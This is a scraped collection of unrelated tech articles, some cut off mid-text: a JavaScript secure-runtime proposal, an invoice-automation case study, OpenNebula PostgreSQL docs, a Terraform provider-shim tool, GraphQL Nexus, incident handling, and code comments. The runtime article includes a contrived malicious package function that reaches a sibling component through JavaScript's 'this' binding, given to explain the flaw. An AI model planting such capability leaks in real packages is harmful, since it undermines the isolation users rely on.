</p><p>Towards (3) we already <a rel="noopener" href="https://nodejs.org/dist/latest-v14.x/docs/api/cli.html#cli_frozen_intrinsics">shipped the `--frozen-intrinsics` flag in Node.js</a>. (1) and (2) clearly require breaking changes to what we have in any existing runtimes today.</p>

<h2><a href="#criticisms">#</a>Criticisms</h2>

<p>The criticisms of this model include the Spectre class of vulnerabilities, the difficulty in providing secure cross-package interfaces, and that these ideas might sound good in theory but are impractical in real JS environments.

<a name="spectre"></a>
</p><h3><a href="#spectre">#</a>Spectre</h3>

<p>The Spectre class of attacks means that code running on the same process can use CPU reverse engineering and timing information to read secret information
used by other separate code in the same process. Think - passwords, secure tokens, etc.

</p><p>The first thing to note is that Spectre is the ability to steal secrets and not the ability to install a trojan horse on your computer. Even if we can't fully mitigate Spectre (and we can certainly try), we are still limiting destructive capabilities such as giving full disk and network access
  to random people on the internet, which is a huge win. What we are comparing this model against, is having no separate security for third-party libraries at all, which is the case in Node.js, Deno and browsers today. <em>In the case of an attack, it is better to just lose a credit card, than to lose a credit card AND have your house burnt down.</em>

</p><p>The second thing to note here is that if you have a true capability system and can carefully control network access, then the capability to exfiltrate (basically to use <code>fetch</code>), can itself be treated as a critical permission. Secrets might be discovered but not as easily shared.

</p><p>The counterargument to controlling the capability to exfiltrate is that there are always side channels to be found - the blinking of a light through whatever complex window to share the information of the secret token. It's a complex boundary to mitigate.

</p><p>Finally, in terms of genuine Spectre mitigations, Cloudflare have this same problem for their same-process deployment of Cloudflare Workers, which they recently discussed here - <a rel="noopener" target="_blank" href="https://blog.cloudflare.com/mitigating-spectre-and-other-security-threats-the-cloudflare-workers-security-model/">Mitigating Spectre and Other Security Threats: The Cloudflare Workers Security Model</a>.

</p><p>Their mitigations are summarized at the end, and roughly involve:

</p><ul>
<li>Restricting Date.now() and multi-threading via new Worker (which allows custom timer creation) to attempt to disable the time measurements necessary to initiate the attack.
</li><li>Proactively detecting the attack behaviour based on monitoring and initiating full isolation.
</li><li>Exploring memory shuffling techniques so that secret information does not remain static.
</li></ul>

<p>As Cloudflare mention, this is an active mitigation space that can continue to be developed. In theory, these similar mitigations could apply to new runtime development as well.

</p><p>The important thing to note is that these mitigation techniques do not apply to the Web platform at all as they are simply not possible (at least not without <a rel="noopener" target="_blank" href="https://github.com/tc39/proposal-realms">Realms</a>). The Google / v8 position completely makes sense, given this angle,
  but the focus I want to make is on <strong>new JavaScript runtimes</strong>, like successors to Node.js such as Deno and others, <em>which should really be exploring these security properties today</em>.

<a name="insecure-module-interfaces"></a>
</p><h3><a href="#insecure-module-interfaces">#</a>Insecure Module Interfaces</h3>

<p>The next major problem comes down to the complex interface boundary between third-party packages. For example, consider the following code:

</p><pre><code>
import { renderer } from 'renderer';
import { renderGraph } from 'graph';
import { renderTitle } from 'title';

renderer.render([renderGraph, renderTitle]);
</code></pre>

<p>In theory, <code>renderGraph</code> doesn't need any other capabilities other than the ability to call into the renderer so it can be treated as low-trust code.

</p><p>But now consider a malicious implementation of <code>renderGraph</code>:

</p><pre><code>
export function renderGraph () {
  this[1].setTitle('Changed the title');
}
</code></pre>

<p><code>renderGraph</code> knows the renderer will call it via <code>renderArray[i]()</code>, which in JavaScript will set the <code>this</code> binding to the array itself, thus giving access to the title component from the graph component.

</p><p>Yes, it's a contrived example, but it demonstrates how easily you can get capability spillage in JavaScript, and that's before we even get to information spillage eg via <code>toString()</code>.

</p><p>Locking down these sorts of inadvertant side channels means making all package interfaces out of <code>SafeFunction</code> and <code>SafeObject</code> objects that don't have these sorts of awful flaws, and it's not an easy problem to solve - this is where the bulk of the effort needs to be made.

</p><p>The other side of this to consider is that Web Assembly module interfaces don't have these same sorts of capability and information spillage that we have in JavaScript, which certainly gives hope for future ecosystems dealing with these problems.

<a name="impractical-constraints"></a>
</p><h3><a href="#impractical-constraints">#</a>Impractical Constraints</h3>

<p>The third argument is that the security requirements are simply too much of a constraint on JavaScript and its ecosystems. That there exists no path from the ecosystems today to this kind of secure ecosystem. As a result, secure runtimes will always be a fringe effort
  adopted by the few who can invest in the time and effort to support them.

</p><p>This, I believe, is the most crucial problem to solve. The ability to run third-party libraries with less risk should be fully democratized.

<a name="secure-modular-runtime-proposal"></a>
</p><h2><a href="#secure-modular-runtime-proposal">#</a>Secure Modular Runtime Proposal</h2>

<p>I'd like to propose a hypothetical runtime for JavaScript, as a strawman, and to invite scrutiny as to whether this solves the following problems:

</p><ol>
<li>That this runtime can fully restrict high-level capability access from packages for third-party code running in the same process than we have in Node.js, Deno and browsers today.
</li><li>That this runtime can support …</li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Posti boosts purchase invoice automation with Aito</h2><p>The RPA team of Posti has moved to the next level by adding machine learning into their toolbox. Using Aito has allowed Posti to utilize machine learning independently and the first Aito implementation is now live in production, tirelessly churning through thousands of purchase invoices and saving their finance team countless of hours worth of mechanical work.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/posti_quote.png" alt="Aito has provided Posti a fast and easy tool to implement machine learning to business processes, adding new opportunities to our Intelligent Automation toolkit."></p></div></div><h2>Automation in the Finnish logistics giant</h2><p>As the largest postal service operator in Finland, Posti delivers hundreds of thousands of parcels and envelopes daily around the country. This naturally involves much more behind the scenes than just the logistics though, and automation has been at the core of Posti for years.</p><p>To streamline its operations, Posti’s RPA Center of Excellence has been automating countless business processes within the company. With Aito now in their toolbox, the RPA team can conquer even complex processes without having to go through the data science pipeline. No custom code or scripts are needed either since interaction with Aito happens directly through standard UiPath activities.</p><h2>Handling purchase invoices</h2><p>By using Aito and in collaboration with Sisua Digital, Posti has automated their purchase invoice handling processing. Processing the 3000 new invoices every month requires several cognitive decisions, making automation impossible with traditional RPA methods. Before storing the final version in their invoice management system, each digital invoice needs to be:</p><ol><li>Assigned to the right reviewer</li><li>Allocated to the right cost center</li><li>Tagged for the right category</li><li>Corrected in case of missing information</li></ol><p>Visualizing the problem with some mock data, this is how a new invoice looks like entering the system. A correct value needs to be selected for the empty fields.</p><table><thead><tr><th>Vendor_Code</th><th>Inv_Amt</th><th>VAT_Code</th><th>Item_Description</th><th>Product_Category</th><th>Reviewer</th><th>CC_Code</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>VENDOR-1676</td><td>83.24</td><td></td><td>Artworking/Typesetting ...</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>Posti has automated this process by creating a software robot with UiPath and having it interact with Aito. The robot reads the information in each new invoice and asks Aito to predict the right values.</p><table><thead><tr><th>Vendor_Code</th><th>Inv_Amt</th><th>VAT_Code</th><th>Item_Description</th><th>Product_Category</th><th>Reviewer</th><th>CC_Code</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>VENDOR-1676</td><td>83.24</td><td>VAT-24</td><td>Artworking/Typesetting ...</td><td>CLASS-1593</td><td>R-085</td><td>CC-164</td><td></td><td></td><td></td></tr></tbody></table><h2>Launching the robot</h2><p>To test the performance of the new automation, it was first operated in parallel with the manual process for one month and all the predictions of Aito were recorded for evaluation. During the simulation, Aito’s predictions fulfilled the accuracy requirement of 95% set by the project steering group, giving it the green light for production. The first version of the robot includes a few of types of purchase invoices in one legal company. Later during this the fall, more companies and invoice types will be added.</p><p>During its first couple of months in production, more than 7,000 purchase invoices have been processed automatically. The new automation has reduced the workload on the Accounts Payable team at Posti while boosting the speed of invoice review. But even more importantly, the RPA team of Posti now has the ability to replicate the technology for countless other business processes. After the initial learning curve, they found Aito very straightforward to use with standard UiPath functionality.</p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>

<p>Important</p>
<p>This feature is a <strong>Technology Preview</strong>. It’s not recommended for production environments!</p>
</div>
<p>The PostgreSQL back-end is an alternative to SQLite and MySQL/MariaDB back-ends. All back-ends cannot coexist, and you will have to decide which one is going to be used while planning your OpenNebula installation. It’s not possible to automatically migrate the existing OpenNebula database from SQLite or MySQL/MariaDB to PostgreSQL.</p>
<p>Features:</p>
<ul>
<li>Required <strong>PostgreSQL 9.5 or newer</strong> (WARNING: base RHEL/CentOS 7 contains unsupported PostgreSQL 9.2!)</li>
<li>No migrator for existing deployments from SQLite or MySQL/MariaDB</li>
<li>No full-text search support</li>
</ul>
<div>
<p>Note</p>
<p>If you are planning to install OpenNebula with PostgreSQL back-end, please follow this guide <strong>prior</strong> to starting OpenNebula for the first time to avoid problems with oneadmin and serveradmin credentials.</p>
</div>
<div id="installation">
<h2>Installation<a href="#installation" title="Permalink to this headline">¶</a></h2>
<p>First of all, you need a working PostgreSQL server <strong>version 9.5 or newer</strong>. You can either deploy one for the OpenNebula installation or reuse any existing PostgreSQL already deployed and accessible by the Frontend. We assume you have PostgreSQL server installed and running.</p>
<div id="configuring-postgresql">
<h3>Configuring PostgreSQL<a href="#configuring-postgresql" title="Permalink to this headline">¶</a></h3>
<p>Create new database user <code><span>oneadmin</span></code> and provide own password for database user:</p>
<div><div><pre><span></span>$ sudo -i -u postgres -- createuser -E -P oneadmin
Enter password for new role: **********
Enter it again: **********
</pre></div>
</div>
<p>Create database <code><span>opennebula</span></code> with owner <code><span>oneadmin</span></code>:</p>
<div><div><pre><span></span>$ sudo -i -u postgres -- createdb -O oneadmin opennebula
</pre></div>
</div>
<div>
<p>Note</p>
<p>The database doesn’t need to be created if the database user has privileges to create databases. In that case, OpenNebula creates the database on the first connect. To keep the lowest needed privileges, it’s recommended to follow the steps above and prepare everything beforehand.</p>
</div>

<p>You can move Uno Platform pages and other code into a multi-targeted library that you can reference from the Uno Platform head projects. This is much more convenient than using Visual Studio Shared libraries. Shared libraries don’t seem to have full support in Visual Studio, and some features like quick refactors often don’t work. This article briefly explains what I did to get this working. I completely removed the shared library in my sample. You can clone my&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://github.com/MelbourneDeveloper/Samples/tree/master/UnoCrossPlatformTemplate">working sample</a>&nbsp;here.&nbsp;</p>

Also, this process seems support hot-reload.</p>



<p>The trick is that this template project uses SDK type MSBuild.Sdk.Extras . These types of projects build for all the different platforms mentioned. Here is some of the config in the csproj file. The noteworthy part is the TargetFrameworks. We can’t merely build for .NET Standard. We need libraries for all the platforms we want to target.</p>

  &lt;GenerateLibraryLayout&gt;true&lt;/GenerateLibraryLayout&gt;

  &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;    
&lt;/PropertyGroup&gt;</pre>



<p>I took the time to add some basic features to the project so that you can get started with Uno Platform development quickly. Also, it gives you Cat Facts! The only extra dependency I have added is to&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://github.com/MelbourneDeveloper/RestClient.Net">RestClient.Net</a>, which the app uses to make Web API calls. These are the features of the project at the time of publishing this article. I will try to update and fix this sample moving into the future.</p>



<ul><li>Current version of Uno Platform (3.0.12)</li><li>C# version 8</li><li>FxCop with my flavor of code rules. This prevents common coding mistakes. Check out the documentation at the&nbsp;<a target="_blank" href="https://github.com/dotnet/roslyn-analyzers" rel="noreferrer noopener">Roslyn Github repo</a>.</li><li>RestClient .Net for APIs</li><li>ViewModel with binding</li><li>ICommands</li><li>Converters</li><li><strong><em>No shared project</em></strong></li><li>Nullable turned on. This a feature of C# 8 to reduce the need for null checking</li></ul>



<p>In Progress</p>



<ul><li>Hot reload doesn’t seem to work. Shout out if you know why!</li><li>There is a build problem on Mac because it cannot build for UWP. Let me know if you know how to ignore this on Mac for Visual Studio</li></ul>



<p>Watch a video of the app:</p>

    <div id="content">
      
<p>Two weeks ago, Hashicorp has announced <a href="https://www.hashicorp.com/blog/announcing-hashicorp-terraform-0-13/">the release of Terraform 0.13.0</a>.
This release automates the installation of third-party providers, which was a major pain point when using such providers until now.
Unfortunately, this solution puts the burden of providing a service implementing <a href="https://www.terraform.io/docs/internals/provider-registry-protocol.html">registry protocol</a> onto the third-party plugin providers.
With time, we expect that most of the community-provided plugins will be available through such registries, but at the moment, most of them are not.</p>
<p>As a stopgap solution, we have implemented a so-called <a href="https://github.com/numtide/generate-terraform-provider-shim">Provider Shim generator</a>.</p>
<h2 id="provider-shims">Provider Shims</h2>
<p>TL;DR: Provider Shim is a <code>bash</code> script that gets placed in the repository, and that downloads, caches and executes the real Terraform provider when accessed.
Due to it's size it's very suitable to be checked along side the Terraform code in source code repositories.</p>
<h2 id="background">Background</h2>
<p>Before we can explain what Provider Shim does, it is crucial to understand what a Terraform provider is and how Terraform interacts with the providers.</p>
<h3 id="what-is-a-terraform-provider">What is a Terraform provider?</h3>
<p>Basic building blocks of Terraform are Resources and Data sources.
Resource is something that is managed (created, updated, destroyed) by Terraform, for example an EC2 instance, or a Storage Bucket in Google Cloud.
On the other hand, Data source is something that is not managed by Terraform per se (for example: GCP VM that has been manually created), but can be queried by Terraform to get information about it (such as public IP address of the said VM).</p>
<p>Terraform itself does not know how to interact with the resources, it only manages information about the resources, and all the operations (create, read, update, destroy) are delegated to so called providers.</p>
<p>Providers are executable files that are started and terminated by Terraform when needed.
Once started, Terraform communicates with a provider through a Unix socket using a <a href="https://github.com/hashicorp/terraform-plugin-sdk/blob/master/internal/tfplugin5/tfplugin5.proto">GRPC protocol</a>.
Providers on their own do not store any state, but are provided by Terraform with the state whenever an operation (such as <code>ReadResource</code>, <code>PlanResourceChange</code>, ..) needs to be performed.</p>
<h3 id="how-does-terraform-gets-its-providers">How does Terraform gets its providers?</h3>
<p>When <code>terraform init</code> is performed, Terraform downloads all the required modules and parses their HCLs (<code>.tf</code> files).
Among other things, HCLs contain <a href="https://www.terraform.io/docs/configuration/provider-requirements.html">provider requirements</a>, describing which versions of providers (and since Terraform 0.13.x locations of the registries) are required.</p>
<p>For each such requirement, Terraform will perform the following steps:</p>
<ul>
<li>Try finding the plugin on the local machine, in the following directories
<ul>
<li>Current directory: <code>.</code> (used mainly for plugin development)</li>
<li>Same directory where <code>terraform</code> binary is located</li>
<li><code>terraform.d/plugins</code></li>
<li><code>.terraform.d/plugins</code></li>
<li><code>~/.terraform.d/plugins</code></li>
</ul>
</li>
<li>If the plugin binary is not available in any of those locations, try downloading the plugin from the registry, storing it in <code>.terraform.d/plugins</code></li>
</ul>
<p>Once <code>terraform init</code> was successful, <code>terraform plan/apply/destroy</code> will be searching for needed plugins in the same directories as the <code>terraform init</code> would search.</p>
<h2 id="what-happens-if-a-provider-is-not-available-through-a-registry">What happens if a provider is not available through a registry?</h2>
<p>Performing <code>terraform init</code> is a really convenient way to install all providers needed by your Terraform project, provided that your provider is available using the provider registry protocol.
If that is not the case, things are getting uggly.</p>
<p>When your Terraform project depends on a community provider that can't be downloaded with <code>terraform init</code>, one has to somehow obtain binary of the provider and put it in the correct path for Terraform to find it.</p>
<p>This is very tedious and error prone manual process that has to be repeated for every provider and every location where Terraform is executed.</p>
<p>To make this easier, one can use one of the relative paths to the root Terraform module (such as <code>terraform.d/plugins</code> or <code>.terraform.d/plugins</code>) and check them in together with the terraform code into source control version.</p>
<p>This leads to repeatable builds with the manual task being done only once, but it also means that the source control contains all the binaries of the providers (each of them being megabytes in size) - working with such source repositories can be very daunting.</p>
<h3 id="provider-shim-saves-the-day">Provider Shim saves the day</h3>
<p>Instead of checking in the binary of a provider, we propose checking in a so called Provider Shim.</p>
<p>Shim is a small Bash script that will check if there is a copy of the provider binary on the local disk, if not, it will download the binary from GitHub and after the binary is available it will start the binary.</p>
<p>Such a shim would be small in size (less than 2 kilobytes) is a Bash script, making it easy to review and debug.</p>
<p>An example of such a Shim looks like this:</p>
<pre><code><span>#!/usr/bin/env bash

</span><span>exec </span><span>"${plugin_binary_path}" </span><span>$@
</span></code></pre><h3 id="what-does-the-provider-shim-do">What does the Provider Shim do?</h3>
<p>Provider Shim performs the following operations:</p>
<ul>
<li>Check if the binary of the provider is available in <code>~/.cache/terraform-providers</code>.</li>
<li>If there is no binary available, use <code>curl</code> to fetch an archive of the binary from the release in GitHub.</li>
<li>When fetched, extract the binary from the archive.</li>
<li>Check the integrity of the binary against a known SHA1 of the binary.
This step will detect if someone has replaced the binary of the provider in the GitHub release or on the local disk.</li>
<li>If the SHA1 matches, <code>exec</code> the provider giving it the same ARGs that shim has received, which will replace the <code>bash</code> process with the process of the provider binary.</li>
</ul>
<h3 id="what-happens-when-terraform-finds-the-provider-shim-at-the-right-place">What happens when Terraform finds the Provider Shim at the right place?</h3>
<p>Once terraform executes the Provider Shim instead of the provider, Provider Shim will (if needed) download the binary of the provider and start the provider.</p>
<p>All of this is transparent for Terraform, as if the provider binary was directly executed.</p>
<p>The only noticeable difference is the wait time for the fetching of the provider over the network using <code>curl</code>.
This happens only once, after that provider binary is cached on the local disk and won't be downloaded again.</p>
<h2 id="generating-provider-shims">Generating Provider Shims</h2>
<p>Generating such Provider Shims manually is a repetitive task that can be easily automated.
For this purpose, we have implemented a <a href="https://github.com/numtide/generate-terraform-provider-shim">command line utility</a> to generate such shims.</p>
<p>In order to generate shims for your terraform project, execute <code>generate-terraform-provider-shim &lt;provider path&gt;</code> in the directory of your root Terraform module.
Required <code>&lt;provider path&gt;</code> argument is the <code>&lt;owner&gt;/&lt;project&gt;</code> GitHub path of the project of the provider.</p>
<p>By default, <code>generate-terraform-provider-shim</code> will find latest release of the provider and generate a shim for it in <code>terraform.d/</code> directory for each arch supported by the provider.</p>
<p>If a specific version is required, an argument <code>--version=&lt;semver matcher&gt;</code> can be provided.</p>
<p>Generated Provider Shim can (and should be checked in together with the Terraform code)</p>
<p>Since version 0.2.0, the shim generator will generate shims in proper paths for both Terraform <code>0.12.x</code> and <code>0.13.x</code>, making it a great tool for a smooth transition to Terraform <code>0.13.x</code>.</p>
<h2 id="limitations">Limitations</h2>
<p>Like every hack, Provider Shims come with a set of limitations.
We are aware of the following constraints for using Provider Shims:</p>
<h3 id="dependencies">Dependencies</h3>
<p>Due to it's nature, Provider Shims have number of dependencies that have to be installed on the system in order for it to work.
Fortunately, most of those dependencies are available on many Unix-like systems.</p>
<p>Here is the list of dependencies:</p>
<ul>
<li><code>bash</code>: Provider Shims are <code>bash</code> scripts relying on <code>bash</code> internal commands.</li>
<li><code>curl</code>: used for fetching archives of the community provider.</li>
<li><code>unzip</code> or <code>gzip</code>/<code>tar</code>: depending on the archive type used in the provider release, either unzip or <code>tar</code>/<code>gzip</code> are required.</li>
<li><code>git</code>: we took an unorthodox approach to use <code>git</code> internal command to calculate SHA1 of the provider binary. Rational behind this: most of the time Terraform projects are stored in <code>git</code> repositories, hence <code>git</code> will be available.</li>
</ul>
<h3 id="only-providers-with-binaries-attached-to-the-github-releases-are-supported">Only providers with binaries attached to the GitHub releases are supported</h3>
<p>We are relying on the developers of the provider to create releases with attached compiled binaries of the providers for different architectures.
If that is not the case, a Provider Shim cannot be generated.</p>
<h3 id="only-tar-gz-and-zip-archives-are-supported">Only .tar.gz and .zip archives are supported</h3>
<p>There is no standard way of packaging providers.
Most of the time they are packaged in a Zip or Gzipped Tar archive - those are formats we are supporting.</p>
<h3 id="windows-is-not-supported">Windows is not supported</h3>
<p>We do not have access to a Windows machine and have never run terraform in a Windows environment, hence the generated shims will definitely not work under Windows.</p>
<h3 id="can-t-be-executed-in-terraform-cloud">Can't be executed in Terraform Cloud</h3>
<p>Since VMs used in Terraform cloud are lacking numerous <a href="https://numtide.com/articles/generate-terraform-provider-shim/#Dependencies">dependencies</a> (most notably: <code>curl</code>), Provider Shims cannot be used in <code>Remote</code> execution mode of Terraform Cloud.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Provider Shims can be very useful in Terraform <code>0.12.x</code> world and also can be useful for the …</p></div></div></div>

August 25, 2020 | https://blog.graphqleditor.com/graphql-nexus-codefirst-graphql-server/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/graphql-nexus-codefirst-graphql-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>GraphQL schema is a set of rules describing the functionality available to the client, including specification of operations (queries and mutations) that can be executed to execute against your data graph. When building a GraphQL service, there is a choice that needs to be made whether you want to follow the code-first or schema-first path: </p>
<ul>
<li>Schema-first - which prioritizes process of designing the schema which puts schema as your source of truth and forces your code to follow the definitions stored in your schema,</li>
<li>Code-first (resolver-first) - is an approach where the GraphQL schema is implemented programmatically.</li>
</ul>
<p>In either case, we will end up with a fully functional GraphQL service, but this choice will influence your project in terms of the amount of work you will need to put to introduce some features (but it’s a topic that deserves to be covered in a separate post).</p>
<h2>Code-first framework for GraphQL Server development</h2>
<p>The rapid growth of GraphQL’s popularity generated the natural need for different tools, both schema-first and code-first oriented, facilitating GraphQL working experience. One of the tools representing the code-first approach is <a href="https://nexus.js.org/">GraphQL Nexus framerwork</a>.</p>
<p>GraphQL Nexus is a GraphQL framework for building your GraphQL Server, where the schema is defined and implemented programmatically. GraphQL Nexus relies on a Node.js and TypeScript thanks to which it can provide features such as:</p>
<ul>
<li><strong>Type-Safety</strong> -  type-definitions are being generated as you proceed with the development process &amp; inferred in your code, providing you with auto-completion and error catching,</li>
<li><strong>Compatibility with GraphQL Ecosystem</strong> - GraphQL Nexus relies heavily on graphql-js and works well with its existing types when constructing the schema which makes the auto-generated schema compatible with most popular tools like Apollo Server etc.,</li>
<li><strong>Data-Agnostic</strong> - GraphQL Nexus is a declarative syntax layered on the top of the graphql-js library which basically means that you can achieve with it all that you can do with graphql-js or apollo-tools.</li>
</ul>
<p>Having figured out all the types you need for your schema all you need to do is simply use <code>makeSchema</code> function to create the schema instance that would be used as the foundation for your GraphQL server.</p>
<div data-language="tsx"><pre><code><span>const</span> schema <span>=</span> <span>makeSchema</span><span>(</span><span>{</span>
  
  types<span>:</span> <span>[</span>User<span>,</span> Query<span>,</span> Mutation<span>]</span><span>,</span>

  
  outputs<span>:</span> <span>{</span>
    typegen<span>:</span> __dirname <span>+</span> <span>'/generated/typings.ts'</span><span>,</span>
    schema<span>:</span> __dirname <span>+</span> <span>'/generated/schema.graphql'</span><span>,</span>
  <span>}</span><span>,</span>

  
  nonNullDefaults<span>:</span> <span>{</span>
    input<span>:</span> <span>true</span><span>,</span>
    output<span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

</code></pre></div>
<h2>Getting started</h2>
<p>As previously mentioned GraphQL Nexus relies heavily on <code>graphql-js</code> and it’s also required for the installation:</p>
<div data-language="text"><pre><code>npm install nexus
npm install graphql # required as a peer dependency</code></pre></div>
<p>The best way to begin with GraphQL Nexus is of course the <a href="https://nexus.js.org/docs/getting-started">official documentation</a>. After familiarizing with it the next step could be playing around with their <a href="https://github.com/prisma/nexus/tree/develop/examples">official examples</a> and the <a href="https://nexus.js.org/playground">online Playground</a>. Have fun!</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>For most companies Incident Commander or Incident Manager is not a
specific job, it’s a role you may take on when something has gone, often
horribly, wrong and you need to quickly unite an adhoc group into a team
to resolve it. The incident commander should be the point of contact,
and source of truth, about your incident and to do that successfully
they’ll need to be updated and kept informed about what’s happening.
Depending on how experienced they are in the role this can be a very
light touch experience or it can feel like being constantly nagged to
put the washing away while someone burns money nearby.</p>
<p>I’ve been involved in a fair few incidents over the years and one of the
best approaches I’ve seen to handling updates and interruptions was from
someone who had an amazing internal clock; or a watch we never noticed.
When handling an incident he’d essentially give himself a 30 minute,
reset-able, window of time. Once he’d been given the initial
introduction to the incident he’d step back, handle the communication
and anything else the incident responders has asked for and wait for
about 30 minutes.</p>
<p>If no one gave him any new information or status updates he’d consider
it an invitation to interrupt and ask what was going on. Once he’d been
updated he’d move back and let the team run with the problem. If someone
gave him an update before the 30ish minutes were up he’d reset his
timer, leave you alone and try to get whatever you’d asked for. I don’t
know if it was just a well chosen period based on experience or the
limit of his patience but 30 minutes was often enough to stop people
rabbit holing while the fires were raging.</p>
<p>Once I’d left the team he often managed incidents for and became one of
his internal customers I began to notice that everyone in his area
developed the subconscious habit of delivering their status updates
every 25 minutes or so, even when he wasn’t the incident manager for
a specific incident. I never discovered if this was all a deliberate
attempt to set the culture he wanted or he was just being himself but as
someone handling an incident I always appreciated the time and
predictability of his involement. Thanks to LinkedIn and Twitter I could
probably track him down and ask but I’ve always liked the idea it was
just him being himself.</p>

August 25, 2020 | https://www.brainstobytes.com/writing-good-software-comments-i/ | <a href="https://web.archive.org/web/*/https://www.brainstobytes.com/writing-good-software-comments-i/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Comments are, to put it mildly, a controversial topic.</p>
<p>There are two very strong opinions in software development, both extremely popular and widespread. The first one states that comments are evil, and you should not use them under any circumstance. The main argument is that instead of using comments, you should try to make the code as readable as possible. If the code is written in an expressive way using best practices, comments are not needed.</p>
<p>The second group thinks that comments are a necessity. The code can't hold all the information needed to properly maintain a solution, and comments are an effective way of communication for fellow developers. If all we needed was the code, we could grab the binaries and work from them.</p>
<p>I think both groups have something valuable to teach. It's true that comments can be dangerous, some of the reasons why you might be wary of them are:</p>
<ul>
<li>Comments easily become outdated, and it's unreasonable to expect everyone to update every comment when code changes. It would be an ideal thing, but it rarely happens in reality.</li>
<li>Code is the sole source of truth that is guaranteed to be true at any given point through the lifecycle of software.</li>
<li>A bad comment is worse than no comments at all, as it misleads you into wrong assumptions.</li>
<li>When overused, comments clutter our code and make it harder to find the things we are looking for.</li>
</ul>
<p>Comments are essentially there because we weren't able to perfectly express our ideas in code. Every single time you write a comment, think if it's possible to refactor your code in a way that makes it obvious to the reader. With effort and experience, you can remove most of the unnecessary comments from your projects.</p>
<p>Despite their downsides, comments can be used to effectively communicate with fellow developers. The trick is not to repeat your code, but to clarify its intent and provide valuable extra information that you can't represent in code. If you can keep your comments at a higher level of abstraction, you will have a powerful tool for making your code more maintainable.</p>
<p>Let's take a look at 5 scenarios where using comments can help improve the readability of our code:</p>
<h4 id="explainingtheintentandansweringwhy">Explaining the intent and answering why</h4>
<p>Explaining why things are done in a specific way in the code is one of the most accepted uses for comments.</p>
<p>The reason is simple: code itself only tells you <strong>what</strong> is there, not <strong>why</strong> it is there. The motivations behind seemingly arbitrary choices in design and development are usually found in the documentation, but if you need to keep this information in the source code, comments are the best way of doing it.</p>
<p>Feel free to add comments if you feel that something looks too arbitrary, or to let other developers know why you are doing things the way you are doing them. Don't write a huge essay supporting the choice, a quick one-liner is enough to convey information. Other developers will appreciate this valuable information.</p>
<h4 id="clarifyingdetails">Clarifying details</h4>
<p>Sometimes you need to write small clarifications for input arguments or data returned from a function, in this case, a comment might make things easier to understand.</p>
<p>It's also useful for summarizing a series of complicated operations: writing a small comment that explains the intent of the following lines is useful to understand how they work together.</p>
<p>Another common usage is specifying the units of a variable: is this meant to be a distance in meters or feet?</p>
<p>This might be the weakest use case of the list because comments of this type are rendered useless by giving variables and functions good names. If you want some guidelines for naming variables, you can read the <a href="https://www.brainstobytes.com/writing-good-variable-names/">previous article on the topic</a>.</p>
<h4 id="warningtheuserofamethodaboutsideeffects">Warning the user of a method about side effects</h4>
<p>There are methods with 'dangerous' side effects. Some of them will perform actions that are hard or impossible to revert or will remove records from an important record.</p>
<p>You could have in place some special naming conventions to make this clear. The Ruby community, for example, has a convention for appending a '!' character at the end of methods that perform this type of action. If there is a need for a more detailed explanation, feel free to add a comment explaining the possible dangers of calling a specific method.</p>
<pre><code># Warning!: This method will stop the pipeline and all unprocessed data will be lost, 
# ensure the queue is empty before calling it, otherwise, you might lose data. 
def perform_teardown():
#    Implementation of this method
   return
</code></pre>

<p>You can add little reminders for things you need to improve or refactor later. There are lots of changes that don't merit a new ticket in the issue tracking system, and those little reminders can be useful for not forgetting about these little improvements.</p>
<p>Most modern text editors and IDEs have tools for finding those TODOs, and I have the feature enabled in every single one I use (actually, it's one of the first things I do when setting up a new system). Use them with confidence, TODO comments are ok.</p>
<pre><code># TODO: Find out if there's an efficient alternative for linear algebra and make this method a wrapper around it
def transpose_matrix(matrix)
# code for transposing a matrix
end

</code></pre>
<h4 id="publicapidocumentation">Public API documentation</h4>
<p>Documenting the public interface of your classes is a very important part of software development. You want other users (and well, you too) to know how to use your classes and code. There are many tools that let you convert comments into documentation (PDF, HTML, and other formats), as long as you write your comments with a specific format. The tool will scan your code and extract all the required information for the documents.</p>
<p>Some popular examples are Javadoc for Java and YARD for Ruby, the comments on top of methods look like this:</p>
<p>Javadoc:</p>
<pre><code>/**
 * &lt;p&gt;Translates text from English to alienspeak
 * &lt;/p&gt;
 * @param textInEnglish the text in English I want to translate
 * @return the text after being translated into alienspeak
 */
public String translateToAlienspeak(String textInEnglish) {
    // contents of the function
}
</code></pre>
<p>YARD:</p>
<pre><code># Translates a text from English to alienspeak
#
# @param text_in_english [String] the text in English I want to translate
# @return [String] the text after being translated into alienspeak
def translate_to_alienspeak(text_in_english)
  # content of the function
end
</code></pre>

<p>These are just a couple of cases where comments are helpful, but there are many other scenarios where using a comment is the right thing.</p>
<p>The trick for writing good comments is asking yourself why you are writing them in the first place. Is it to fix a deficiency in the clarity of your code? if that's the case, stop and refactor your code to make it more readable. As we said before, most comments can be omitted in favor of a better-written piece of code.</p>
<p>On the other hand, if you are providing information that your colleagues will find helpful, and there is no way to embed that info in the code, then go for a comment. Good comments can be extremely helpful. Just make sure they are <em>good</em> comments, not lazy patches for code that can still improve.</p>
<p>In the next article, we will see scenarios where comments are definitely a bad choice.</p>

